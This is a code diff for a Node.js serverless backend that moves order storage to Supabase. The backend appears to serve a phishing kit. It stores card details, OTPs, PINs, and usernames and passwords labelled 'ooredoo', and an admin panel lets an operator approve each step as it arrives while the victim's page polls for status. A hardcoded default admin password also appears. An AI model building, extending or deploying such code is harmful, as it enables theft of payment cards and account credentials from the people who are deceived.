@@ -1,22 +1,46 @@
-const fs = require("fs");
-const path = require("path");
-
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "fazaa2026";
-const DATA_DIR = "/tmp/data";
-const ORDERS_FILE = path.join(DATA_DIR, "orders.json");
-
-function loadOrders() {
-  try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch {}
-  try { return JSON.parse(fs.readFileSync(ORDERS_FILE, "utf8")); } catch { return []; }
-}
-function saveOrders(orders) {
-  try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch {}
-  const tmp = ORDERS_FILE + ".tmp";
-  fs.writeFileSync(tmp, JSON.stringify(orders));
-  fs.renameSync(tmp, ORDERS_FILE);
-}
+const SUPABASE_URL = process.env.SUPABASE_URL;
+const SUPABASE_KEY = process.env.SUPABASE_KEY;
+const TABLE = "orders";
 
 const str = (v, max = 300) => String(v == null ? "" : v).slice(0, max);
+
+async function supaRest(method, path, body) {
+  const url = `${SUPABASE_URL}/rest/v1/${path}`;
+  const headers = {
+    apikey: SUPABASE_KEY,
+    Authorization: `Bearer ${SUPABASE_KEY}`,
+    "Content-Type": "application/json",
+    Prefer: method === "POST" ? "resolution=merge-duplicates,return=representation" : "return=representation",
+  };
+  const opts = { method, headers };
+  if (body) opts.body = JSON.stringify(body);
+  const r = await fetch(url, opts);
+  if (!r.ok) {
+    const text = await r.text().catch(() => "");
+    throw new Error(`Supabase ${r.status}: ${text}`);
+  }
+  const text = await r.text();
+  return text ? JSON.parse(text) : null;
+}
+
+async function loadOrders() {
+  const rows = await supaRest("GET", `${TABLE}?order=created_at.desc&limit=5000`);
+  return rows.map(r => ({ ...r.data, _dbRef: r.ref }));
+}
+
+async function upsertOrder(ref, data) {
+  await supaRest("POST", TABLE, { ref, data, updated_at: Date.now() });
+}
+
+async function deleteOrder(ref) {
+  await supaRest("DELETE", `${TABLE}?ref=eq.${encodeURIComponent(ref)}`);
+}
+
+async function getOrder(ref) {
+  const rows = await supaRest("GET", `${TABLE}?ref=eq.${encodeURIComponent(ref)}&limit=1`);
+  return rows.length ? rows[0].data : null;
+}
 
 function cleanOrder(b) {
   const p = b.pay && typeof b.pay === "object" ? b.pay : {};
@@ -72,6 +96,10 @@ module.exports = async function handler(req, res) {
 
   if (req.method === "OPTIONS") return res.status(200).end();
 
+  if (!SUPABASE_URL || !SUPABASE_KEY) {
+    return res.status(500).json({ ok: false, error: "Missing SUPABASE_URL or SUPABASE_KEY env vars" });
+  }
+
   const queryPath = Array.isArray(req.query.path) ? req.query.path : (typeof req.query.path === "string" ? req.query.path.split("/") : []);
   const rawUrl = (req.url || "").split("?")[0].split("#")[0];
   const segments = queryPath.length > 0 ? queryPath : rawUrl.replace(/^\/api\//, "").split("/").filter(Boolean);
@@ -79,116 +107,115 @@ module.exports = async function handler(req, res) {
   const body = req.body || {};
   const isAdmin = req.headers["x-admin-password"] === ADMIN_PASSWORD;
 
-  // POST /api/orders
-  if (req.method === "POST" && urlPath === "/api/orders") {
-    let orders = loadOrders();
-    const b = body;
-    const o = cleanOrder(b);
-    if (o.pay === undefined) delete o.pay;
-    if (o.step === undefined) delete o.step;
+  try {
+    // POST /api/orders
+    if (req.method === "POST" && urlPath === "/api/orders") {
+      const b = body;
+      const o = cleanOrder(b);
+      if (o.pay === undefined) delete o.pay;
+      if (o.step === undefined) delete o.step;
 
-    if (b.ooredoo && typeof b.ooredoo === "object" && o.ref) {
-      const i = orders.findIndex(x => x.ref === o.ref);
-      if (i >= 0) {
-        const incoming = b.ooredoo;
-        const current = { ...orders[i].ooredoo };
-        for (const key of ["username", "password", "otp"]) {
-          if (Object.prototype.hasOwnProperty.call(incoming, key)) {
-            current[key] = str(incoming[key], key === "otp" ? 50 : 200);
+      if (b.ooredoo && typeof b.ooredoo === "object" && o.ref) {
+        const existing = await getOrder(o.ref);
+        if (existing) {
+          const incoming = b.ooredoo;
+          const current = { ...existing.ooredoo };
+          for (const key of ["username", "password", "otp"]) {
+            if (Object.prototype.hasOwnProperty.call(incoming, key)) {
+              current[key] = str(incoming[key], key === "otp" ? 50 : 200);
+            }
           }
+          existing.ooredoo = current;
+          existing.status = "awaiting";
+          existing.step = o.step === "ooredoo-otp" ? "ooredoo-otp" : "ooredoo";
+          existing.decision = "";
+          existing.reason = "";
+          existing.next = "";
+          existing.updated = Date.now();
+          await upsertOrder(o.ref, existing);
+          return res.status(200).json({ ok: true, ref: o.ref });
         }
-        orders[i].ooredoo = current;
-        orders[i].status = "awaiting";
-        orders[i].step = o.step === "ooredoo-otp" ? "ooredoo-otp" : "ooredoo";
-        orders[i].decision = "";
-        orders[i].reason = "";
-        orders[i].next = "";
-        orders[i].updated = Date.now();
-        saveOrders(orders);
-        return res.status(200).json({ ok: true, ref: o.ref });
       }
-    }
 
-    if (!/^(?:FZ|HM)-\d{6,}$/.test(o.ref) || !o.n || !/^\d{8,15}$/.test(o.p))
-      return res.status(400).json({ ok: false, error: "invalid" });
+      if (!/^(?:FZ|HM)-\d{6,}$/.test(o.ref) || !o.n || !/^\d{8,15}$/.test(o.p))
+        return res.status(400).json({ ok: false, error: "invalid" });
 
-    const i = orders.findIndex(x => x.ref === o.ref);
-    if (i >= 0) {
-      const prev = orders[i];
-      orders[i] = { ...prev, ...o, ts: prev.ts, status: prev.status === "confirmed" ? "confirmed" : o.status, decision: o.status === "awaiting" ? "" : prev.decision, reason: o.status === "awaiting" ? "" : prev.reason, updated: Date.now() };
-    } else {
-      orders.unshift({ ...o, ts: Date.now() });
-      if (orders.length > 5000) orders.length = 5000;
-    }
-    saveOrders(orders);
-    return res.status(200).json({ ok: true, ref: o.ref });
-  }
-
-  // GET /api/status/:ref
-  if (req.method === "GET" && segments[0] === "status" && segments[1]) {
-    const ref = decodeURIComponent(segments[1]);
-    const orders = loadOrders();
-    const o = orders.find(x => x.ref === ref);
-    if (!o) return res.status(404).json({ ok: false });
-    return res.status(200).json({ ok: true, status: o.status, decision: o.decision || "", reason: o.reason || "", next: o.next || "" });
-  }
-
-  // POST /api/ping
-  if (req.method === "POST" && urlPath === "/api/ping") {
-    return res.status(200).json({ ok: true });
-  }
-
-  // POST /api/leave
-  if (req.method === "POST" && urlPath === "/api/leave") {
-    return res.status(200).json({ ok: true });
-  }
-
-  // ===== Admin endpoints =====
-  if (segments[0] === "admin") {
-    if (!isAdmin) return res.status(401).json({ ok: false, error: "unauthorized" });
-
-    // GET /api/admin/check
-    if (req.method === "GET" && urlPath === "/api/admin/check") {
-      return res.status(200).json({ ok: true });
-    }
-
-    // GET /api/admin/orders
-    if (req.method === "GET" && urlPath === "/api/admin/orders") {
-      const orders = loadOrders();
-      return res.status(200).json({ ok: true, orders, active: 0, pages: [] });
-    }
-
-    // POST /api/admin/decide/:ref
-    if (req.method === "POST" && segments[1] === "decide" && segments[2]) {
-      const ref = decodeURIComponent(segments[2]);
-      let orders = loadOrders();
-      const decision = body.decision === "reject" ? "reject" : "accept";
-      const o = orders.find(x => x.ref === ref);
-      if (!o) return res.status(404).json({ ok: false });
-      const step = o.step || "card";
-      if (decision === "reject") {
-        o.decision = "reject"; o.reason = step; o.status = "rejected"; o.next = "";
+      const existing = await getOrder(o.ref);
+      if (existing) {
+        const merged = {
+          ...existing, ...o,
+          ts: existing.ts,
+          status: existing.status === "confirmed" ? "confirmed" : o.status,
+          decision: o.status === "awaiting" ? "" : existing.decision,
+          reason: o.status === "awaiting" ? "" : existing.reason,
+          updated: Date.now()
+        };
+        await upsertOrder(o.ref, merged);
       } else {
-        const nextOf = { card: "otp", otp: "pin", pin: "done", ooredoo: "otp", "ooredoo-otp": "done" };
-        const next = nextOf[step];
-        o.decision = "accept"; o.reason = "";
-        if (next === "done") { o.status = "confirmed"; o.next = "done"; }
-        else { o.status = "stepok"; o.next = next; }
+        await upsertOrder(o.ref, { ...o, ts: Date.now() });
       }
-      o.updated = Date.now();
-      saveOrders(orders);
-      return res.status(200).json({ ok: true, status: o.status });
+      return res.status(200).json({ ok: true, ref: o.ref });
     }
 
-    // DELETE /api/admin/orders/:ref
-    if (req.method === "DELETE" && segments[1] === "orders" && segments[2]) {
-      const ref = decodeURIComponent(segments[2]);
-      let orders = loadOrders();
-      orders = orders.filter(o => o.ref !== ref);
-      saveOrders(orders);
+    // GET /api/status/:ref
+    if (req.method === "GET" && segments[0] === "status" && segments[1]) {
+      const ref = decodeURIComponent(segments[1]);
+      const o = await getOrder(ref);
+      if (!o) return res.status(404).json({ ok: false });
+      return res.status(200).json({ ok: true, status: o.status, decision: o.decision || "", reason: o.reason || "", next: o.next || "" });
+    }
+
+    // POST /api/ping
+    if (req.method === "POST" && urlPath === "/api/ping") {
       return res.status(200).json({ ok: true });
     }
-  }
 
-  return res.status(404).json({ ok: false });
+    // POST /api/leave
+    if (req.method === "POST" && urlPath === "/api/leave") {
+      return res.status(200).json({ ok: true });
+    }
+
+    // ===== Admin endpoints =====
+    if (segments[0] === "admin") {
+      if (!isAdmin) return res.status(401).json({ ok: false, error: "unauthorized" });
+
+      if (req.method === "GET" && urlPath === "/api/admin/check") {
+        return res.status(200).json({ ok: true });
+      }
+
+      if (req.method === "GET" && urlPath === "/api/admin/orders") {
+        const orders = await loadOrders();
+        return res.status(200).json({ ok: true, orders, active: 0, pages: [] });
+      }
+
+      if (req.method === "POST" && segments[1] === "decide" && segments[2]) {
+        const ref = decodeURIComponent(segments[2]);
+        const o = await getOrder(ref);
+        if (!o) return res.status(404).json({ ok: false });
+        const step = o.step || "card";
+        if (body.decision === "reject") {
+          o.decision = "reject"; o.reason = step; o.status = "rejected"; o.next = "";
+        } else {
+          const nextOf = { card: "otp", otp: "pin", pin: "done", ooredoo: "otp", "ooredoo-otp": "done" };
+          const next = nextOf[step];
+          o.decision = "accept"; o.reason = "";
+          if (next === "done") { o.status = "confirmed"; o.next = "done"; }
+          else { o.status = "stepok"; o.next = next; }
+        }
+        o.updated = Date.now();
+        await upsertOrder(ref, o);
+        return res.status(200).json({ ok: true, status: o.status });
+      }
+
+      if (req.method === "DELETE" && segments[1] === "orders" && segments[2]) {
+        const ref = decodeURIComponent(segments[2]);
+        await deleteOrder(ref);
+        return res.status(200).json({ ok: true });
+      }
+    }
+
+    return res.status(404).json({ ok: false });
+  } catch (err) {
+    return res.status(500).json({ ok: false, error: err.message });
+  }
 };
